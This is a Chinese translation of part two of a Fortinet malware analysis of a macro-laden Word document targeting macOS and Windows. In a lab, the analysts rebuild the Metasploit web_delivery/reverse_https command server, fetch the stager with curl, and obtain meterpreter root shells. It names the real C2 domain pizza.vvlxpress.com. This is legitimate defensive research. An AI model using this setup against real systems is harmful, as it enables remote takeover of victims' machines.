> 原文链接: https://www.anquanke.com//post/id/85855 


# 【木马分析】针对Mac OS X和Windows两大系统的恶意word文档分析（二）


                                阅读量   
                                **98713**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：fortinet.com
                                <br>原文地址：[http://blog.fortinet.com/2017/03/29/microsoft-word-file-spreads-malware-targeting-both-mac-os-x-and-windows-part-ii](http://blog.fortinet.com/2017/03/29/microsoft-word-file-spreads-malware-targeting-both-mac-os-x-and-windows-part-ii)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t016719fb7d5d5d3179.png)](https://p1.ssl.qhimg.com/t016719fb7d5d5d3179.png)**

****

翻译：[shinpachi8](http://bobao.360.cn/member/contribute?uid=2812295712)

预估稿费：170RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**传送门**

[**【木马分析】针对Mac OS X和Windows两大系统的恶意word文档分析****（一）**](http://bobao.360.cn/learning/detail/3663.html)

**<br>**

**前言**

在3月22号我们发布的[博文](http://blog.fortinet.com/2017/03/22/microsoft-word-file-spreads-malware-targeting-both-apple-mac-os-x-and-microsoft-windows)，([安全客地址](http://bobao.360.cn/learning/detail/3663.html)) 中, FortiGuard实验室介绍了一款针对于MACOS和WINDOWS的新Word宏恶意软件。 在对这款恶意软件进一步调查之后，我们确信在成功感染之后，后渗透的meterperter代理会运行在目标的系统上。Meterpreter是Metasploit的一部分，更多的信息可以在[这里看到](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)。

为了让Meterpreter成功运行，攻击者的服务器上一定会运行着Metasploit来作为控制中心控制被感染的系统。 因为攻击者的服务器并没有作出任何响应，我们决定安装 Metasploit来确认我们的观察。

这篇博客提供了我们设置的服务器来进行攻击行为的复现，来看看攻击者可以在受感染的系统上做什么。

<br>

**测试环境**

测试环境包含了三台64位虚拟机，分别运行着windows, macos和kali。其中windows和macos分别作为受感染的系统，而kali作为运行着Metasploit的攻击者服务器。

下面是三台服务器的IP地址：

Windows 7: 192.168.71.127

Mac OS X: 192.168.71.128

Kali Linux: 192.168.71.129

<br>

**设置Metasploit**

首先，我们在安装着Metasploit的Kali虚拟机上新建一个包含着设置Metasploit所需命令的脚本。

[![](https://p5.ssl.qhimg.com/t015cdfcf915a0163d0.png)](https://p5.ssl.qhimg.com/t015cdfcf915a0163d0.png)

图1 脚本文件的内容

输入msfconsole -q -r osx_meterpreter_test来在安静模式下(-q)执行Metasploit，并加载脚本文件(-r)。

[![](https://p5.ssl.qhimg.com/t0147dce8e8939d2ec2.png)](https://p5.ssl.qhimg.com/t0147dce8e8939d2ec2.png)

图2 运行Metasploit

一旦加载完之后，运行show options来查看这次会话中的Metasploit的当前配置。

我们这次测试使用了两个Metasploit组件，一个是web_delivery模块，另外一个是reverse_https的payload。

SRVHOST和 LHOST两个参数是用来设置kali系统的IP(192.168.71.129)。 IP地址作为一监听(对于回传的连接，监听在TCP/443本地端口上) 同时作为一个服务端(监听在tcp/8080(SRVPORT)) 来传递reverse_https 这个payload。

show options命令隐藏了某些只能在show advanced命令下查看的设置。唯一没被显示的设置是StagerVerifySSLCert，而这个参数我们设置为false。这样可以防止在建立安全通信时验证SSL证书的有效性。

[![](https://p0.ssl.qhimg.com/t01eaf4d465d4066e65.png)](https://p0.ssl.qhimg.com/t01eaf4d465d4066e65.png)

图3 显示设置攻击时的选项

下一步是执行run命令，意味着开启了HTTPS 反弹处理/服务，这样它就准备好了与靶机的连接。看图4，一段python脚本已经生成，等待感染系统来运行。

[![](https://p0.ssl.qhimg.com/t01856ec68b45ec9d1b.png)](https://p0.ssl.qhimg.com/t01856ec68b45ec9d1b.png)

图4

但是不要直接在靶机上执行这段代码，而是要看HTTPS请求的数据服务端是如何作回应的。 运行curl -k https://192.168.71.129:8080/， 我们可以看到一段python脚本代码被接收了。

[![](https://p5.ssl.qhimg.com/t018570e19f0bbf9119.png)](https://p5.ssl.qhimg.com/t018570e19f0bbf9119.png)

图5 返回靶机的脚本

如果我们把在恶意宏是发现的代码与上一步生成的Metasploit代码做对比，很容易就能看出相同的元素(黄色高亮),但是明显base64编码的内容不同。

[![](https://p1.ssl.qhimg.com/t0168877cf2107f8514.png)](https://p1.ssl.qhimg.com/t0168877cf2107f8514.png)

下一步就是解码base64的数据来查看将会在靶机上执行的代码。 为了完成这一步。调用一下base64工具就足够了，而且也可以在Metasploit的界面上执行。

命令语法是echo “” | base64 -d

[![](https://p1.ssl.qhimg.com/t01508a5a1734391dee.png)](https://p1.ssl.qhimg.com/t01508a5a1734391dee.png)

图6 解码base64数据

在恶意软件的样本中，base64的解码数据被传递到了ExecuteForOSX()函数中(左侧)。 再一次，通过对比两段代码，我们可以看到它们是类似的，当然如果不算URL的话。

[![](https://p0.ssl.qhimg.com/t01d90c490cf5af3592.png)](https://p0.ssl.qhimg.com/t01d90c490cf5af3592.png)

<br>

**演示对Mac OS X的攻击**

接下来，在Mac OS X的机器上，我们创建一个新文件名为"osx_meterpreter.py",这个文件包含着上边表格右侧的代码。然后通过调用Python解释器来执行这一段脚本。

[![](https://p0.ssl.qhimg.com/t011cc52738cfd4486c.png)](https://p0.ssl.qhimg.com/t011cc52738cfd4486c.png)

图7 在 Mac OS X上运行python脚本

我们可以看到程序并没有出任何错误，双击666。

当我们返回Kali上的Metasploit控制台时，我们可以看到一个meterpreter会话已经连接了。 这个sessions命令可以看到目前的meterpreter会话。 输出显示了一个可用的类型为"meterpreter python/osx" 的会话。它表明会话正确的建立了。

[![](https://p0.ssl.qhimg.com/t01ca7112f689cca5c5.png)](https://p0.ssl.qhimg.com/t01ca7112f689cca5c5.png)

图8 一个打开meterpreter会话。

命令sessions -i 1来启动这个会话一个交互的shell， 如meterpreter控制台显示的一样。 我们执行的第一个命令是meterpreter命令： sysinfo, 这个命令收集靶机的信息，然后如图9一样显示出来。在这个场景中，它折中的显示了一个Mac OS X机器 的信息。

[![](https://p4.ssl.qhimg.com/t0133ea973ff779a79f.png)](https://p4.ssl.qhimg.com/t0133ea973ff779a79f.png)

图9 Mac OS X靶机的sys 信息。

现在，为了更刺激一点， shell命令被执行了。这个命令开启了一个可以在本地控制远程靶机的shell。 一个"sh-3.2" 的控制台出现了，从这我们可以执行任何的命令，即相当于在远程靶机执行的命令。 id命令用来显示用户的id值，在这个例子中是"root"用户。

[![](https://p2.ssl.qhimg.com/t01dd2837edee738c46.png)](https://p2.ssl.qhimg.com/t01dd2837edee738c46.png)

图10 得到Mac OS X靶机的shell

还有一点值的提的是，即使Metasploit服务端宕机了，运行在靶机上的python仍然会存活，并一直尝试连接服务器直到服务器上线为止。 一旦这个情况发生了，靶机自动连接并且与服务器建立一个会话。

<br>

**演示Windows 7的攻击**

在Windows7的靶机上，我们要做的第一件事就是修改"hosts"文件, 如下所示，可以在“%SystemRoot%System32driversetc”文件夹下找到。 这个文件是用来建立域名与IP之间的映射的。

[![](https://p1.ssl.qhimg.com/t01f3ea7c9f8592d4f7.png)](https://p1.ssl.qhimg.com/t01f3ea7c9f8592d4f7.png)

图11 修改host文件

作为结果，所有的指向pizza.vvlxpress.com的请求都会被发送到kali(192.168.71.129)系统中。 然后我们让64位DLL在powershell.exe进程中运行。它会连接到运行着Metasploit的Kali系统上。

当我们回到kali上的metasploit的控制台时，我们看到一个meterpreter会话已经打开了。然后我们可以使用sessions命令来查看目前的meterpreter会话。 输出显示了有一个类型为"meterpreter x64/windows"的会话。sysinfo命令如图12所示，显示了windows系统靶机的信息。

[![](https://p5.ssl.qhimg.com/t01b9c2dd376739ad6d.png)](https://p5.ssl.qhimg.com/t01b9c2dd376739ad6d.png)

图12 得到windows靶机的系统信息.

在这个连接建立了之后，我们下一步检查系统信息。如图13, 我们可以对和图12中得到的信息做对比.

[![](https://p2.ssl.qhimg.com/t0121bb0570facb7bb8.png)](https://p2.ssl.qhimg.com/t0121bb0570facb7bb8.png)

图13 感染的windows靶机的信息

然后我们执行shell命令来控制感染的Windows机器。 图14展示了在我们得到shell之后执行dir命令之后的输出。

[![](https://p0.ssl.qhimg.com/t019aeaf519d9f0a9f0.png)](https://p0.ssl.qhimg.com/t019aeaf519d9f0a9f0.png)



**传送门**

[**【木马分析】针对Mac OS X和Windows两大系统的恶意word文档分析****（一）**](http://bobao.360.cn/learning/detail/3663.html)


